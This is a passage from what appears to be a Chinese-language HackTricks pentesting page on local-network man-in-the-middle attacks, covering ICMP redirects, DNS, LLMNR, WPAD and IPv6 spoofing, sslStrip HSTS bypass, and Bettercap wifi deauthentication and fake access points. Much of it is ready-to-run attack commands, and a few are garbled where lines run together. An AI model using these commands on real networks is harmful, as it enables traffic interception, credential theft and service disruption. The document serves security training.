ICMP重定向是指发送一个ICMP类型1代码5的数据包，表明攻击者是到达某个IP的最佳路径。然后，当受害者想要联系该IP时，它会通过攻击者发送数据包。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

攻击者将解析受害者请求的部分（或全部）域名。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**使用dnsmasq配置自己的DNS**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### 本地网关

系统和网络通常存在多条路由。在构建本地网络内MAC地址列表后，使用 _gateway-finder.py_ 来识别支持IPv4转发的主机。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [欺骗LLMNR、NBT-NS和mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

当DNS查找失败时，Microsoft系统使用Link-Local Multicast Name Resolution (LLMNR)和NetBIOS Name Service (NBT-NS)进行本地主机解析。Apple Bonjour和Linux零配置实现使用Multicast DNS (mDNS)在网络内发现系统。这些协议未经认证，通过UDP广播消息；因此，攻击者可以利用它们将用户引导至恶意服务。

您可以使用Responder冒充主机搜索的服务，发送假响应。\
在此阅读更多关于[如何使用Responder冒充服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)的信息。

### [欺骗WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

许多浏览器使用Web Proxy Auto-Discovery (WPAD)从网络加载代理设置。WPAD服务器通过特定URL（例如，[http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)）提供客户端代理设置，通过以下任一方式被识别：

* DHCP，使用代码252条目[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS，在本地域中搜索_wpad_主机名
* Microsoft LLMNR和NBT-NS（在DNS查找失败的情况下）

Responder自动化WPAD攻击——运行代理并通过DHCP、DNS、LLMNR和NBT-NS将客户端引导至恶意WPAD服务器。\
在此阅读更多关于[如何使用Responder冒充服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)的信息。

### [欺骗SSDP和UPnP设备](spoofing-ssdp-and-upnp-devices.md)

您可以在网络中提供不同的服务，尝试**欺骗用户**输入一些**明文凭据**。**有关此攻击的更多信息在**[**欺骗SSDP和UPnP设备**](spoofing-ssdp-and-upnp-devices.md)**。**

### IPv6邻居欺骗

这种攻击与ARP欺骗非常相似，但发生在IPv6世界中。您可以让受害者认为GW的IPv6地址具有攻击者的MAC地址。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 路由器广告欺骗/洪泛

某些操作系统默认根据网络中发送的 RA 数据包配置网关。要声明攻击者为 IPv6 路由器，您可以使用：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP 欺骗

默认情况下，一些操作系统尝试通过读取网络中的 DHCPv6 数据包来配置 DNS。然后，攻击者可以发送一个 DHCPv6 数据包，将自己配置为 DNS。DHCP 还为受害者提供一个 IPv6 地址。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (伪造页面和JS代码注入)

## 互联网攻击

### sslStrip

基本上，当**用户**尝试**访问**一个正在**重定向**到**HTTPS**版本的**HTTP**页面时，**sslStrip**会与**客户端**保持**HTTP连接**，同时与**服务器**保持**HTTPS连接**，这样它就能够以**明文**形式**嗅探**连接。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
更多信息[在此](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)。

### sslStrip+ 和 dns2proxy 用于绕过 HSTS

**sslStrip+ 和 dns2proxy** 与 **sslStrip** 的**区别**在于它们会将例如 _**www.facebook.com**_ **重定向**到 _**wwww.facebook.com**_（注意额外的 "**w**"），并将该域名的**地址设置为攻击者的 IP**。这样，**客户端**将**连接**到 _**wwww.facebook.com**_（即攻击者），但在幕后 **sslstrip+** 将通过 https 与 **www.facebook.com** **保持真实连接**。

这项技术的**目标**是为了**避免 HSTS**，因为 _**wwww**.facebook.com_ **不会**被保存在浏览器的**缓存**中，所以浏览器会被欺骗执行**HTTP 下的 facebook 认证**。\
请注意，为了执行这种攻击，受害者最初尝试访问的必须是 [http://www.faceook.com](http://www.faceook.com) 而不是 https。这可以通过修改 http 页面内的链接来实现。

更多信息[在此](https://www.bettercap.org/legacy/#hsts-bypass)、[在此](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)和[在此](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)。

**sslStrip 或 sslStrip+ 不再有效。这是因为浏览器中预保存了 HSTS 规则，所以即使用户第一次访问一个“重要”的域名，他也会通过 HTTPS 访问它。另外，请注意，预保存的规则和其他生成的规则可以使用标志** [**`includeSubdomains`**](https://hstspreload.appspot.com) **，所以之前的** _**wwww.facebook.com**_ **示例不再有效，因为** _**facebook.com**_ **使用了带有 `includeSubdomains` 的 HSTS。**

待办事项：easy-creds, evilgrade, metasploit, factory

## TCP 监听端口
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL 监听端口

#### 生成密钥和自签名证书
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 使用证书监听
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 使用证书监听并重定向到主机
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
## Bettercap

有时，如果客户端检查CA是有效的，你可以**提供由CA签名的其他主机名的证书**。\
另一个有趣的测试是提供一个**请求的主机名的证书，但它是自签名的**。

其他要测试的事情是尝试用一个有效的证书来签名证书，但它不是一个有效的CA。或者使用有效的公钥，强制使用像diffie hellman这样的算法（一个不需要用真正的私钥解密任何东西的算法），当客户端请求真正的私钥的证明（比如哈希）时，发送一个假的证明，并期望客户端不检查这个。
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### 主动发现笔记

请注意，当UDP数据包发送到没有请求端口的设备时，会发送ICMP（端口不可达）。

### **ARP 发现**

ARP数据包用于发现网络内正在使用的IP地址。PC必须对每个可能的IP地址发送请求，只有正在使用的地址会响应。

### **mDNS（多播DNS）**

Bettercap每隔X毫秒发送一个MDNS请求，询问 **\_services\_.dns-sd.\_udp.local**，看到此数据包的机器通常会回应此请求。然后，它只搜索回应"services"的机器。

**工具**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS（NetBios名称服务器）**

Bettercap向137/UDP端口广播数据包，询问名为"CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"的名称。

### **SSDP（简单服务发现协议）**

Bettercap广播SSDP数据包，搜索所有类型的服务（UDP端口1900）。

### **WSD（Web服务发现）**

Bettercap广播WSD数据包，搜索服务（UDP端口3702）。

## 参考资料

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**漏洞赏金小贴士**：**注册** **Intigriti**，一个由黑客创建，为黑客服务的高级**漏洞赏金平台**！立即加入[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达 **$100,000** 的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>
